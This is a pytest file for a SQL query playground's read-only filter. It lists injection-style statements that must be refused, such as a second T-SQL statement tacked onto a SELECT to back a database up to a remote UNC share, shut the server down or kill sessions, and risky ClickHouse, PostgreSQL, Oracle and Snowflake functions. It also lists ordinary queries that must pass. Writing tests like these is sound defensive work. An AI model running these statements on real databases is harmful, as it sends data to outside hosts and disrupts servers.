"""Security review round 2 (M3): query-filter gaps the second review found.

SQL Server accepts a second statement after a ``SELECT`` with no separator,
and the filter is its only guard (viewers hold ``query.use``):
``select 1 backup database x to disk='\\\\attacker\\s\\x.bak'``, ``restore``,
``shutdown``, ``kill``, ``dbcc``, ``reconfigure``, ``deny``, ``setuser``,
``enable``/``disable trigger``, ``begin tran``, ``declare``, ``open``,
``revert``, ``raiserror`` were allowed. ClickHouse had no read-only session and
several table functions were missing; so were PostgreSQL backup/replication
functions, Oracle ``kupp$proc``, Snowflake presigned-URL builders and MySQL's
``*_pos_wait``.

Now each of those T-SQL words is refused wherever a statement could start
(outside string literals and quoted or qualified identifiers, and not where
the grammar needs an expression: a column called ``open`` or ``begin`` in a
select list stays allowed), the functions are refused by name, and a
ClickHouse playground query runs with ``readonly = 1``.
"""

from __future__ import annotations

import pytest

from src.routers.query_router import _apply_read_only_session, _is_safe_sql

TSQL = [
    "select 1 backup database sales to disk='\\\\203.0.113.9\\s\\x.bak'",
    "select 1 backup log sales to disk='\\\\203.0.113.9\\s\\l.trn'",
    "select 1 restore database sales from disk='\\\\203.0.113.9\\s\\evil.bak' with replace",
    "select 1 kill 53",
    "select 1 shutdown with nowait",
    "select 1 SHUTDOWN",
    "select 1 dbcc freeproccache",
    "select 1 reconfigure",
    "select 1 deny select on t to public",
    "select 1 setuser 'dbo'",
    "select 1 enable trigger all on t",
    "select 1 disable trigger all on database",
    "select 1 raiserror('x', 16, 1) with log",
    "select 1 begin tran",
    "select 1 declare @x int",
    "select 1 open c",
    "select 1 revert",
    "select 1 checkpoint",
    "select a from t where b = 1 backup database x to disk='y'",
    "select count(*) from t backup database x to disk='y'",
    "select 1 if 1=1 select 2 else backup database x to disk='y'",
    "select 1 if 1=1 begin backup database x to disk='y' end",
    "select 1\nkill 53",
    "select 1 /* c */ kill 53",
]

FUNCTIONS = [
    # ClickHouse table functions
    "select * from icebergS3('https://203.0.113.9/x')",
    "select * from icebergLocal('/var/lib/clickhouse/x')",
    "select * from icebergAzure('x')",
    "select * from icebergHDFS('x')",
    "select * from deltaLakeCluster('c', 'https://203.0.113.9/x')",
    "select * from azureBlobStorageCluster('c', 'x')",
    "select * from arrowFlight('203.0.113.9:8815', 'ds')",
    "select * from merge(currentDatabase(), '.*')",
    "select count() from numbers(1e13)",
    "select count() from numbers_mt(1e13)",
    # PostgreSQL backup / replication
    "select pg_start_backup('x')",
    "select pg_stop_backup()",
    "select pg_copy_logical_replication_slot('a', 'b')",
    "select pg_copy_physical_replication_slot('a', 'b')",
    "select pg_replication_origin_create('x')",
    "select pg_replication_origin_drop('x')",
    "select pg_wal_replay_pause()",
    "select pg_wal_replay_resume()",
    # Oracle
    "select sys.kupp$proc.create_master_process('begin null; end;') from dual",
    "select kupp$proc.create_master_process('x') from dual",
    # Snowflake
    "select get_presigned_url(@stage, 'f.csv')",
    "select build_scoped_file_url(@stage, 'f.csv')",
    "select build_stage_file_url(@stage, 'f.csv')",
    # MySQL
    "select master_pos_wait('log.000001', 4, 600)",
    "select source_pos_wait('log.000001', 4, 600)",
]

ORDINARY = [
    "select a, b from t where c = 1",
    "select backup from t",
    "select t.kill from t",
    "select open, high, low, close from prices where open > 10 order by open",
    "select begin, end_at from events where begin > now() order by begin desc",
    'select "backup", "kill" from t',
    "select [open], [begin] from t",
    "select `shutdown` from t",
    "select * from backup",
    "select x as kill from t",
    "select disable from flags where enable = 1 and deny = 0",
    "select count(*), sum(amount), coalesce(a, b) from t group by c having count(*) > 1",
    "with open as (select 1 as v) select v from open",
    "select 'backup database x' as note",
    "select case when a then begin else 0 end from t",
    "select date_trunc('day', created_at), numbers_total from t",
    "select merge_count, merged from t",
    "select checkpoint, status from etl_runs where checkpoint is not null",
    "select * from orders o join customers c on o.cid = c.id where o.total > 100 limit 10",
]


@pytest.mark.parametrize("sql", TSQL)
def test_tsql_statements_after_a_select_are_refused(sql):
    assert not _is_safe_sql(sql), sql


@pytest.mark.parametrize("sql", FUNCTIONS)
def test_listed_functions_are_refused(sql):
    assert not _is_safe_sql(sql), sql


@pytest.mark.parametrize("sql", ORDINARY)
def test_ordinary_selects_still_pass(sql):
    assert _is_safe_sql(sql), sql


class _Conn:
    def __init__(self, settings=None):
        self.options = {"settings": dict(settings)} if settings else {}
        self.executed: list[str] = []

    def get_execution_options(self):
        return dict(self.options)

    def execution_options(self, **kw):
        self.options.update(kw)
        return self

    def execute(self, statement, *_a, **_k):
        self.executed.append(str(statement))


@pytest.mark.parametrize("db", ["clickhouse", "ClickHouse"])
def test_clickhouse_query_runs_read_only(db):
    conn = _Conn({"max_execution_time": 5})
    _apply_read_only_session(conn, db)
    assert conn.options["settings"] == {"max_execution_time": 5, "readonly": 1}
    assert conn.executed == []  # a per-query setting, never a session SET on a pooled connection


def test_clickhouse_readonly_reaches_the_driver():
    """clickhouse_sqlalchemy hands ``execution_options(settings=...)`` to clickhouse_driver per query."""
    pytest.importorskip("clickhouse_sqlalchemy")
    from clickhouse_sqlalchemy.drivers.native.connector import Cursor

    class Transport:
        def execute(self, *_a, **kw):
            self.kwargs = kw
            return [], []

    class Ctx:
        dialect = None
        execution_options = {"settings": {"readonly": 1}}

    cursor = Cursor.__new__(Cursor)
    cursor._connection = type("C", (), {"transport": Transport()})()
    cursor.make_external_tables = lambda *_a: None
    execute, kwargs = cursor._prepare(Ctx())
    assert kwargs["settings"] == {"readonly": 1}
